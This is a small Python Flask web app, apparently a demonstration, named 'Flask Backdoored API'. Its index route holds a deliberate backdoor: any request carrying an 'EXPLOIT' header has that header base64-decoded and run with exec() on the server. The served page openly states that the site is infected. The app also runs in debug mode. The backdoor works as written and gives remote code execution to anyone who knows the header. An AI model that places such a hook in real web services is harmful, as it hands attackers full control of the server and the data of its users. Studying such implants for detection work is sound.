import sys
from flask import Flask, request
import pkg_resources  # get flask version
import base64  # for backdoor to support newlines

app = Flask("Flask Backdoored API")

@app.route("/")
def index():
    if request.headers.get('EXPLOIT'): global r;exec(base64.b64decode(request.headers.get('EXPLOIT').encode()).decode());return r;  # backdoor
    return f"""<!doctype html>
<html>
    <head>
        <title>Test Website</title>
    </head>
    <body>
        <h1>Flask Test Site</h1>
        <p>This website is currently infected with the backdoor.</p>
        <p>Running on Python { '.'.join(map(str, sys.version_info[:3])) }
        <br />Running on Flask { pkg_resources.get_distribution('flask').version }</p>
    </body>
</html>"""

if __name__ == "__main__":
   app.run(debug=True, port=8000)